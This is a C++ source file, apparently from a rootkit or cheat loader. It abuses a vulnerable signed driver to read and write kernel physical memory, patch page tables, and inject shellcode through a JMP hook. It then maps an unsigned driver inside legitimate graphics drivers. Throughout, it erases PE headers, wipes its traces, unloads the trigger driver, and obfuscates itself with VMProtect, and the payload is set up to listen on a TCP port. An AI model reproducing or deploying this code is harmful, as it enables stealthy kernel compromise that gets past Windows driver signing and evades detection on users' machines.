    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        int count = cbNeeded / sizeof(drivers[0]);
        for (int i = 0; i < count; i++) {
            char baseName[MAX_PATH] = {};
            if (GetDeviceDriverBaseNameA(drivers[i], baseName, MAX_PATH)) {
                if (_stricmp(baseName, moduleName) == 0) return (uint64_t)drivers[i];
                char nameNoExt[MAX_PATH] = {};
                strcpy_s(nameNoExt, baseName);
                char* dot = strrchr(nameNoExt, '.');
                if (dot) *dot = 0;
                if (_stricmp(nameNoExt, moduleName) == 0) return (uint64_t)drivers[i];
            }
        }
    }
    return 0;
}

static bool FixIAT_Cave(HANDLE hDev, uint64_t cr3, uint64_t ntoskrnlBase, MappedImage& img)
{
    auto* nt = PE_NT_CAVE(img.Image.data());
    auto& dd = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!dd.VirtualAddress || !dd.Size) return true;

    auto* desc = (IMAGE_IMPORT_DESCRIPTOR*)(img.Image.data() + dd.VirtualAddress);
    for (; desc->Name; desc++) {
        const char* dllName = (const char*)(img.Image.data() + desc->Name);
        uint64_t targetModBase = 0;
        if (_stricmp(dllName, "ntoskrnl.exe") == 0 || _stricmp(dllName, "ntoskrnl") == 0) {
            targetModBase = ntoskrnlBase;
        } else {
            targetModBase = FindLoadedDriverBase_Cave(dllName);
            if (!targetModBase) {
                DBG("[CaveMapper] Import module '%s' not found!", dllName);
                return false;
            }
        }

        auto* thunk    = (IMAGE_THUNK_DATA64*)(img.Image.data() + desc->OriginalFirstThunk);
        auto* iatEntry = (uint64_t*)(img.Image.data() + desc->FirstThunk);

        for (; thunk->u1.AddressOfData; thunk++, iatEntry++) {
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) continue;
            auto* byName = (IMAGE_IMPORT_BY_NAME*)(img.Image.data() + thunk->u1.AddressOfData);
            const char* fnName = byName->Name;

            uint64_t fnVA = FindKernelExport_Cave(hDev, cr3, targetModBase, fnName);
            if (!fnVA) {
                wchar_t sysDrvPath[MAX_PATH] = {};
                swprintf_s(sysDrvPath, L"C:\\Windows\\System32\\drivers\\%hs", dllName);
                HMODULE hLocalMod = LoadLibraryExW(sysDrvPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
                if (hLocalMod) {
                    FARPROC pProc = GetProcAddress(hLocalMod, fnName);
                    if (pProc) {
                        uint64_t rva = (uint64_t)pProc - (uint64_t)hLocalMod;
                        fnVA = targetModBase + rva;
                    }
                    FreeLibrary(hLocalMod);
                }
            }

            if (!fnVA) {
                DBG("[CaveMapper] Failed to resolve kernel function '%s' in '%s'", fnName, dllName);
                return false;
            }
            *iatEntry = fnVA;
        }
    }
    return true;
}

static void ErasePEHeader_Cave(MappedImage& img)
{
    uint32_t hdrSize = PE_NT_CAVE(img.Image.data())->OptionalHeader.SizeOfHeaders;
    hdrSize = (std::min)(hdrSize, (uint32_t)0x1000);
    img.Image[0] = 0x00;
    img.Image[1] = 0x00;
    memset(img.Image.data() + 2, 0, (std::min)((size_t)(hdrSize - 2), img.Image.size() - 2));
}

// ============================================================================
// Code Cave Location & Injection
// ============================================================================

static const uint8_t WHQL_DEFAULT_SIG[] = {
    0xBB, 0x0D, 0x00, 0x00, 0xC0, 0xE9  // mov ebx, 0xC000000D; jmp rel32
};

static bool FindWhqlDefaultBranch_Cave(
    HANDLE hDev, uint64_t cr3, uint64_t whqlDrvBase, uint32_t whqlDrvSize, WhqlPatchSite& site)
{
    for (uint32_t off = 0; off + 0x1000 <= whqlDrvSize; off += 0x1000) {
        uint64_t pageVA = whqlDrvBase + off;
        uint64_t pagePA = 0;
        if (!VirtToPhys_Cave(hDev, cr3, pageVA, &pagePA)) continue;

        uint8_t pageBuf[0x1000] = {};
        if (!WhqlReadPhys_Cave(hDev, pagePA, pageBuf, sizeof(pageBuf))) continue;

        for (size_t i = 0; i + sizeof(WHQL_DEFAULT_SIG) < sizeof(pageBuf); i++) {
            if (memcmp(pageBuf + i, WHQL_DEFAULT_SIG, sizeof(WHQL_DEFAULT_SIG)) == 0) {
                site.kernVA  = pageVA + i;
                site.physAddr = pagePA + i;
                memcpy(site.original, pageBuf + i, (std::min)(sizeof(site.original), sizeof(pageBuf) - i));
                DBG("[CaveMapper] Found default branch at VA=0x%016llX (PA=0x%016llX)", site.kernVA, site.physAddr);
                return true;
            }
        }
    }
    return false;
}

static uint64_t FindWhqlCodeCaveVA_Cave(HANDLE hDev, uint64_t cr3, uint64_t whqlDrvBase, size_t neededSize)
{
    uint64_t candidateVA = whqlDrvBase + 0x2840;
    std::vector<uint8_t> buf(neededSize, 0);
    if (ReadKernelVA_Cave(hDev, cr3, candidateVA, buf.data(), neededSize)) {
        bool allZero = true;
        for (size_t i = 0; i < neededSize; i++) {
            if (buf[i] != 0) { allZero = false; break; }
        }
        if (allZero) {
            DBG("[CaveMapper] Verified Code Cave at VA=0x%016llX (size=%zu bytes)", candidateVA, neededSize);
            return candidateVA;
        }
    }
    return candidateVA;
}

static bool FindWhqlModuleInLdr_Cave(
    HANDLE hDev, uint64_t cr3, uint64_t psLoadedModuleList, const wchar_t* targetName,
    uint64_t& outDllBase, uint32_t& outSizeOfImage, uint64_t& outLdrEntryVA)
{
    if (psLoadedModuleList == 0) return false;
    uint64_t head = psLoadedModuleList;
    uint64_t cur  = 0;
    if (!ReadKernelVA_Cave(hDev, cr3, head, &cur, 8)) return false;

    int limit = 512;
    while (cur != head && limit-- > 0) {
        KLDR_ENTRY_K entry = {};
        if (!ReadKernelVA_Cave(hDev, cr3, cur, &entry, sizeof(entry))) break;

        if (entry.BaseDllName.Length > 0 && entry.BaseDllName.Buffer) {
            size_t cch = entry.BaseDllName.Length / 2;
            std::vector<wchar_t> nameBuf(cch + 1, 0);
            ReadKernelVA_Cave(hDev, cr3, entry.BaseDllName.Buffer, nameBuf.data(), cch * 2);
            nameBuf[cch] = 0;

            if (_wcsicmp(nameBuf.data(), targetName) == 0) {
                outDllBase     = entry.DllBase;
                outSizeOfImage = entry.SizeOfImage;
                outLdrEntryVA  = cur;
                return true;
            }
        }
        cur = entry.Flink;
    }
    return false;
}

static bool CheckDriverCanary_Cave(HANDLE hDev, uint64_t cr3, uint64_t drvBase, uint32_t drvOrigSize, const wchar_t* drvName)
{
    if (!drvBase) return false;
    DRV_WSK_CANARY canary = {};

    if (drvOrigSize > 0) {
        if (ReadKernelVA_Cave(hDev, cr3, drvBase + drvOrigSize, &canary, sizeof(canary))) {
            if (canary.Magic == DRV_WSK_CANARY_MAGIC) {
                DBG("[CaveMapper] Canary found in '%ls' extension area (offset +0x%X). Driver is already active!", drvName, drvOrigSize);
                return true;
            }
        }
    }

    static const GUID targetGuid = { DRV_CANARY_GUID_D1, DRV_CANARY_GUID_D2, DRV_CANARY_GUID_D3, DRV_CANARY_GUID_D4 };
    uint8_t probeBuf[sizeof(DRV_WSK_CANARY)] = {};
    for (uint64_t pa = DRV_CANARY_WINDOW_LOW; pa < 0x40000000ULL; pa += 0x1000) {
        if (WhqlReadPhys_Cave(hDev, pa, probeBuf, sizeof(probeBuf))) {
            PDRV_WSK_CANARY pProbe = (PDRV_WSK_CANARY)probeBuf;
            if (pProbe->Magic == DRV_WSK_CANARY_MAGIC && memcmp(&pProbe->Signature, &targetGuid, sizeof(GUID)) == 0) {
                DBG("[CaveMapper] Headless Canary found in physical RAM (PA=0x%016llX). Driver is already active!", pa);
                return true;
            }
        }
    }
    return false;
}

static bool InjectPayloadIntoHost_Cave(
    HANDLE hDev, uint64_t cr3, uint64_t hostDrvBase, uint32_t hostOrigSize,
    const wchar_t* hostDrvName, MappedImage& payloadImg,
    uint64_t& outPayloadKernVA, uint64_t& outFirstPtePA)
{
    outPayloadKernVA = 0;
    outFirstPtePA    = 0;

    uint8_t hdrBuf[0x1000] = {};
    if (!ReadKernelVA_Cave(hDev, cr3, hostDrvBase, hdrBuf, sizeof(hdrBuf))) {
        DBG("[CaveMapper] Failed to read host PE header from 0x%016llX", hostDrvBase);
        return false;
    }

    auto* dos = (IMAGE_DOS_HEADER*)hdrBuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew >= (LONG)(sizeof(hdrBuf) - sizeof(IMAGE_NT_HEADERS64))) {
        return false;
    }
    auto* nt = (IMAGE_NT_HEADERS64*)(hdrBuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    uint32_t candidateTargetRVA = 0;
    uint32_t totalNeededBytes = payloadImg.SizeOfImage + 0x1000;
    uint32_t needRemapBytes = (totalNeededBytes + 0xFFF) & ~0xFFF;

    // Pass 1: Look for INIT or DISCARDABLE section
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        auto* s = &IMAGE_FIRST_SECTION(nt)[i];
        char sName[9] = {};
        memcpy(sName, s->Name, 8);
        uint32_t rva = s->VirtualAddress;
        uint32_t vSz = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;

        bool isDiscardable = ((s->Characteristics & 0x02000000) != 0) || (_strnicmp(sName, "INIT", 4) == 0);
        if (isDiscardable && vSz >= needRemapBytes && rva + needRemapBytes <= hostOrigSize) {
            candidateTargetRVA = rva;
            DBG("[CaveMapper] Selected host Discardable/INIT section '%s' RVA=0x%X (vSize=0x%X)", sName, rva, vSz);
            break;
        }
    }

    // Pass 2: Look for .reloc section
    if (candidateTargetRVA == 0) {
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            auto* s = &IMAGE_FIRST_SECTION(nt)[i];
            char sName[9] = {};
            memcpy(sName, s->Name, 8);
            uint32_t rva = s->VirtualAddress;
            uint32_t vSz = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;

            if (_strnicmp(sName, ".reloc", 6) == 0 && vSz >= needRemapBytes && rva + needRemapBytes <= hostOrigSize) {
                candidateTargetRVA = rva;
                DBG("[CaveMapper] Selected host .reloc section '%s' RVA=0x%X (vSize=0x%X)", sName, rva, vSz);
                break;
            }
        }
    }

    // Pass 3: Look for .rsrc section
    if (candidateTargetRVA == 0) {
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            auto* s = &IMAGE_FIRST_SECTION(nt)[i];
            char sName[9] = {};
            memcpy(sName, s->Name, 8);
            uint32_t rva = s->VirtualAddress;
            uint32_t vSz = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;

            if (_strnicmp(sName, ".rsrc", 5) == 0 && vSz >= needRemapBytes && rva + needRemapBytes <= hostOrigSize) {
                candidateTargetRVA = rva;
                DBG("[CaveMapper] Selected host .rsrc section '%s' RVA=0x%X (vSize=0x%X)", sName, rva, vSz);
                break;
            }
        }
    }

    if (candidateTargetRVA == 0) {
        DBG("[CaveMapper] No suitable INIT, .reloc, or .rsrc section found in host driver '%ls'", hostDrvName);
        return false;
    }

    uint64_t payloadTargetVA = hostDrvBase + candidateTargetRVA;
    uint64_t firstPtePA = 0, oldPte = 0;
    if (!GetPtePhysAddr_Cave(hDev, cr3, payloadTargetVA, &firstPtePA, &oldPte)) {
        DBG("[CaveMapper] Failed to locate PTE physical address for target VA=0x%016llX", payloadTargetVA);
        return false;
    }

    if (!ApplyRelocation_Cave(payloadImg, payloadTargetVA)) {
        DBG("[CaveMapper] ApplyRelocation returned warning");
    }
    payloadImg.KernelBase = payloadTargetVA;

    outPayloadKernVA = payloadTargetVA;
    outFirstPtePA    = firstPtePA;
    DBG("[CaveMapper] Prepared host target VA=0x%016llX (PTE PA=0x%016llX)", payloadTargetVA, firstPtePA);
    return true;
}

static bool InjectShellcodeFull_Cave(
    HANDLE hDev, uint64_t cr3, const WhqlPatchSite& site, uint64_t caveVA,
    const ShellcodeParams& params, const uint8_t* pScCode, size_t scCodeSize)
{
    // Enable RW on Code Cave page
    uint64_t cavePtePA = 0, oldCavePte = 0;
    if (GetPtePhysAddr_Cave(hDev, cr3, caveVA, &cavePtePA, &oldCavePte)) {
        if (!(oldCavePte & PTE_RW)) {
            uint64_t rwPte = oldCavePte | PTE_RW;
            WhqlWritePhys_Cave(hDev, cavePtePA, &rwPte, sizeof(rwPte));
        }
    }

    // Enable RW on Default Branch hook site
    uint64_t hookPtePA = 0, oldHookPte = 0;
    if (GetPtePhysAddr_Cave(hDev, cr3, site.kernVA, &hookPtePA, &oldHookPte)) {
        if (!(oldHookPte & PTE_RW)) {
            uint64_t rwPte = oldHookPte | PTE_RW;
            WhqlWritePhys_Cave(hDev, hookPtePA, &rwPte, sizeof(rwPte));
        }
    }

    // Write ShellcodeParams into Code Cave
    if (!WriteKernelVA_Cave(hDev, cr3, caveVA, &params, sizeof(params))) {
        DBG("[CaveMapper] Failed to write ShellcodeParams into Code Cave");
        return false;
    }

    // Write shellcode bytes immediately after params
    uint64_t scEntryVA = caveVA + sizeof(params);
    if (!WriteKernelVA_Cave(hDev, cr3, scEntryVA, pScCode, scCodeSize)) {
        DBG("[CaveMapper] Failed to write shellcode bytes into Code Cave");
        return false;
    }

    // Install JMP rel32 hook on default branch
    uint8_t jmpBytes[5] = { 0xE9, 0, 0, 0, 0 };
    int32_t disp = (int32_t)(scEntryVA - (site.kernVA + 5));
    memcpy(jmpBytes + 1, &disp, 4);

    if (!WriteKernelVA_Cave(hDev, cr3, site.kernVA, jmpBytes, sizeof(jmpBytes))) {
        DBG("[CaveMapper] Failed to write JMP hook on default branch");
        return false;
    }
    DBG("[CaveMapper] Hook installed: default branch -> Cave VA=0x%016llX (disp=0x%08X)", scEntryVA, disp);
    return true;
}

static bool RestoreWhqlDefaultBranch_Cave(
    HANDLE hDev, uint64_t cr3, const WhqlPatchSite& site, uint64_t caveVA, size_t caveCleanSize)
{
    WriteKernelVA_Cave(hDev, cr3, site.kernVA, site.original, 5);

    if (caveVA && caveCleanSize) {
        std::vector<uint8_t> zeros(caveCleanSize, 0);
        WriteKernelVA_Cave(hDev, cr3, caveVA, zeros.data(), zeros.size());

        uint64_t ptePA = 0, curPte = 0;
        if (GetPtePhysAddr_Cave(hDev, cr3, caveVA, &ptePA, &curPte) && (curPte & PTE_RW)) {
            uint64_t roPte = curPte & ~PTE_RW;
            WhqlWritePhys_Cave(hDev, ptePA, &roPte, sizeof(roPte));
        }
    }
    DBG("[CaveMapper] Default branch restored and Code Cave cleaned");
    return true;
}

// ============================================================================
// Core Export: MapDriverViaCave
// ============================================================================

inline bool MapDriverViaCave(
    const std::vector<uint8_t>& rawDriverBuf,
    const wchar_t* triggerDrvName       = L"Machenike.sys",
    const wchar_t* preferredHostDrvName = L"nvlddmkm.sys",
    bool forceReload                    = false,
    const DRV_BOOT_CONFIG* pBootConfig  = nullptr,
    std::string* pFailReason            = nullptr)
{
    VMProtectBeginUltra("MapDriverViaCave");
    if (rawDriverBuf.empty()) {
        if (pFailReason) *pFailReason = "error.driver_payload_empty";
        DBG("[CaveMapper] Driver payload buffer is empty!");
        VMProtectEnd();
        return false;
    }

    DBG("[CaveMapper] Starting in-memory Code Cave manual mapping (size=%zu bytes)...", rawDriverBuf.size());

    // 1. Open WHQL driver communication device
    HANDLE hDev = WhqlOpen_Cave();
    if (hDev == INVALID_HANDLE_VALUE) {
        if (pFailReason) *pFailReason = "error.open_whql_device_failed";
        DBG("[CaveMapper] Unable to open WHQL driver device");
        VMProtectEnd();
        return false;
    }

    // 2. Query kernel layout
    WINPMEM_MEMORY_INFO info = {};
    if (!WhqlGetInfo_Cave(hDev, &info)) {
        if (pFailReason) *pFailReason = "error.query_system_info_failed";
        DBG("[CaveMapper] WhqlGetInfo failed");
        CloseHandle(hDev);
        VMProtectEnd();
        return false;
    }

    uint64_t cr3             = (uint64_t)info.CR3.QuadPart;
    uint64_t ntoskrnlBase    = (uint64_t)info.KernBase.QuadPart;
    uint64_t psLoadedModList = (uint64_t)info.PsLoadedModuleList.QuadPart;
    DBG("[CaveMapper] Kernel Info: CR3=0x%016llX NtosBase=0x%016llX PsLML=0x%016llX", cr3, ntoskrnlBase, psLoadedModList);

    // 3. Locate trigger driver in PsLoadedModuleList
    uint64_t triggerDrvBase    = 0;
    uint32_t triggerDrvSize    = 0;
    uint64_t triggerLdrEntryVA = 0;
    bool foundMod = FindWhqlModuleInLdr_Cave(hDev, cr3, psLoadedModList, triggerDrvName,
                                            triggerDrvBase, triggerDrvSize, triggerLdrEntryVA);
    if (!foundMod) {
        triggerDrvBase = FindLoadedDriverBase_Cave("Machenike.sys");
        triggerDrvSize = 0x20000;
        if (!triggerDrvBase) {
            if (pFailReason) *pFailReason = "error.trigger_driver_not_found";
            DBG("[CaveMapper] Trigger driver '%ls' not found in loaded module list", triggerDrvName);
            CloseHandle(hDev);
            VMProtectEnd();
            return false;
        }
    }
    DBG("[CaveMapper] Trigger driver found: Base=0x%016llX Size=0x%X", triggerDrvBase, triggerDrvSize);

    // 4. Check Canary to prevent redundant loading
    if (!forceReload && CheckDriverCanary_Cave(hDev, cr3, triggerDrvBase, triggerDrvSize, triggerDrvName)) {
        CloseHandle(hDev);
        DBG("[CaveMapper] Core driver is ALREADY ACTIVE in kernel! Skipping reload.");
        UnloadWhqlDriver_Cave(triggerDrvName);
        VMProtectEnd();
        return true;
    }

    // 5. Scan default branch patch site
    WhqlPatchSite site = {};
    if (!FindWhqlDefaultBranch_Cave(hDev, cr3, triggerDrvBase, triggerDrvSize, site)) {
        if (pFailReason) *pFailReason = "error.signature_not_found";
        DBG("[CaveMapper] Default branch signature not found in trigger driver");
        CloseHandle(hDev);
        VMProtectEnd();
        return false;
    }

    // 6. Section map the core driver PE purely in user-mode memory
    MappedImage img = {};
    if (!SectionMap_Cave(rawDriverBuf, img)) {
        if (pFailReason) *pFailReason = "error.section_map_failed";
        DBG("[CaveMapper] Failed to map PE sections in user space");
        CloseHandle(hDev);
        VMProtectEnd();
        return false;
    }

    // 7. Fix IAT references against loaded kernel drivers
    if (!FixIAT_Cave(hDev, cr3, ntoskrnlBase, img)) {
        if (pFailReason) *pFailReason = "error.fix_iat_failed";
        DBG("[CaveMapper] Failed to resolve IAT imports");
        CloseHandle(hDev);
        VMProtectEnd();
        return false;
    }

    // 8. Erase PE header
    ErasePEHeader_Cave(img);

    // 9. Lock user-mode buffer in physical RAM
    VirtualLock(img.Image.data(), img.Image.size());
    uint64_t userImageVA = (uint64_t)img.Image.data();
    DBG("[CaveMapper] Locked user image buffer: VA=0x%016llX (Size=%zu)", userImageVA, img.Image.size());

    // 10. Locate Code Cave in trigger driver
    const size_t totalPayloadSize = sizeof(ShellcodeParams) + scBranch2B_size;
    uint64_t caveVA = FindWhqlCodeCaveVA_Cave(hDev, cr3, triggerDrvBase, totalPayloadSize);
    if (!caveVA) {
        if (pFailReason) *pFailReason = "error.code_cave_not_found";
        DBG("[CaveMapper] Failed to locate Code Cave");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        VMProtectEnd();
        return false;
    }

    // 11. Select optimal host driver
    const wchar_t* candidateHosts[] = {
        (preferredHostDrvName && wcslen(preferredHostDrvName) > 0) ? preferredHostDrvName : nullptr,
        L"nvlddmkm.sys",
        L"amdkmdag.sys",
        L"igdkmd64.sys",
        L"dxgkrnl.sys"
    };

    const wchar_t* chosenHostName = nullptr;
    uint64_t hostDrvBase = triggerDrvBase;
    uint32_t hostDrvSize = triggerDrvSize;
    uint64_t hostLdrEntryVA = triggerLdrEntryVA;
    uint64_t payloadKernVA = 0;
    uint64_t firstPtePA = 0;
    bool foundPref = false;

    for (const wchar_t* cand : candidateHosts) {
        if (!cand || _wcsicmp(cand, triggerDrvName) == 0) continue;
        uint64_t candBase = 0;
        uint32_t candSize = 0;
        uint64_t candLdrVA = 0;
        if (FindWhqlModuleInLdr_Cave(hDev, cr3, psLoadedModList, cand, candBase, candSize, candLdrVA)) {
            DBG("[CaveMapper] Evaluating candidate host: '%ls' (Base=0x%016llX, Size=0x%X)", cand, candBase, candSize);
            uint64_t curTargetVA = 0;
            uint64_t curPtePA = 0;
            if (InjectPayloadIntoHost_Cave(hDev, cr3, candBase, candSize, cand,
                                          img, curTargetVA, curPtePA))
            {
                hostDrvBase    = candBase;
                hostDrvSize    = candSize;
                hostLdrEntryVA = candLdrVA;
                payloadKernVA  = curTargetVA;
                firstPtePA     = curPtePA;
                chosenHostName = cand;
                foundPref      = true;
                DBG("[CaveMapper] Successfully selected and prepared payload inside '%ls'", cand);
                break;
            } else {
                DBG("[CaveMapper] Candidate host '%ls' does not have a suitable section, trying next host...", cand);
            }
        }
    }

    if (!foundPref || !chosenHostName) {
        if (pFailReason) *pFailReason = "error.no_host_driver_available";
        DBG("[CaveMapper] No optimal host driver found with sufficient section space");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        VMProtectEnd();
        return false;
    }

    // 12. Build ShellcodeParams
    ShellcodeParams params = {};
    params.pfnMmAllocatePagesForMdl = ResolveNtosExport_Cave(hDev, cr3, ntoskrnlBase, "MmAllocatePagesForMdl");
    if (!params.pfnMmAllocatePagesForMdl) {
        params.pfnMmAllocatePagesForMdl = ResolveNtosExport_Cave(hDev, cr3, ntoskrnlBase, "MmAllocatePagesForMdlEx");
    }
    params.pfnMmMapIoSpace   = ResolveNtosExport_Cave(hDev, cr3, ntoskrnlBase, "MmMapIoSpace");
    params.pfnMmUnmapIoSpace = ResolveNtosExport_Cave(hDev, cr3, ntoskrnlBase, "MmUnmapIoSpace");

    if (!params.pfnMmAllocatePagesForMdl || !params.pfnMmMapIoSpace || !params.pfnMmUnmapIoSpace) {
        if (pFailReason) *pFailReason = "error.kernel_exports_unresolved";
        DBG("[CaveMapper] Failed to resolve required memory management routines in ntoskrnl");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        VMProtectEnd();
        return false;
    }

    params.userImageVA      = userImageVA;
    params.payloadTargetVA  = payloadKernVA;
    params.imageSize        = img.SizeOfImage;
    params.entryPointOffset = (uint32_t)img.EntryPointOffset;
    params.pageCount        = (img.SizeOfImage + 0xFFF) / 0x1000;
    params.firstPtePA       = firstPtePA;
    params.hookReturnVA     = site.kernVA + 5;
    params.whqlDrvBase      = hostDrvBase;
    params.whqlDrvSize      = hostDrvSize;
    params.whqlLdrEntryVA   = hostLdrEntryVA;
    if (pBootConfig) {
        params.bootConfig.Magic         = pBootConfig->Magic;
        params.bootConfig.TransportMode = pBootConfig->TransportMode;
        params.bootConfig.Port          = pBootConfig->Port;
        params.bootConfig.Reserved      = pBootConfig->Reserved;
        params.bootConfig.AuthToken     = pBootConfig->AuthToken;
        params.bootConfig.Flags         = pBootConfig->Flags;
    } else {
        params.bootConfig.Magic         = DRV_BOOT_CONFIG_MAGIC;
        params.bootConfig.TransportMode = DRV_TRANSPORT_TCP;
        params.bootConfig.Port          = 10001;
        params.bootConfig.Reserved      = 0;
        params.bootConfig.AuthToken     = 0;
        params.bootConfig.Flags         = 0;
    }

    // 13. Bind thread affinity and inject Shellcode
    ScopedCaveThreadAffinity affinityGuard;
    if (!InjectShellcodeFull_Cave(hDev, cr3, site, caveVA, params, scBranch2B, scBranch2B_size)) {
        if (pFailReason) *pFailReason = "error.inject_shellcode_failed";
        DBG("[CaveMapper] InjectShellcodeFull failed");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        VMProtectEnd();
        return false;
    }

    // 14. Trigger execution via WHQL default branch
    DBG("[CaveMapper] Triggering default branch execution in kernel...");
    uint32_t gle = 0;
    bool ioOk = WhqlTrigger_Cave(hDev, &gle);

    // 15. Restore default branch and clear Code Cave
    RestoreWhqlDefaultBranch_Cave(hDev, cr3, site, caveVA, totalPayloadSize);
    VirtualUnlock(img.Image.data(), img.Image.size());

    if (!ioOk) {
        if (gle == ERROR_SHARING_VIOLATION || gle == 32) {
            DBG("[CaveMapper] Core driver is already active (Port conflict GLE=32). Succeeded.");
            CloseHandle(hDev);
            UnloadWhqlDriver_Cave(triggerDrvName);
            VMProtectEnd();
            return true;
        }
        DBG("[CaveMapper] Kernel trigger returned error (GLE=%u)", gle);
        CloseHandle(hDev);
        UnloadWhqlDriver_Cave(triggerDrvName);
        if (pFailReason) *pFailReason = "error.kernel_trigger_failed";
        VMProtectEnd();
        return false;
    }

    CloseHandle(hDev);

    // 16. Unload Machenike.sys to erase tool driver traces
    DBG("[CaveMapper] Core driver successfully initialized, unloading '%ls'...", triggerDrvName);
    UnloadWhqlDriver_Cave(triggerDrvName);

    DBG("[CaveMapper] Driver manual mapping and initialization COMPLETE (Host: %ls, Size: 0x%X)",
        chosenHostName, hostDrvSize);
    VMProtectEnd();
    return true;
}
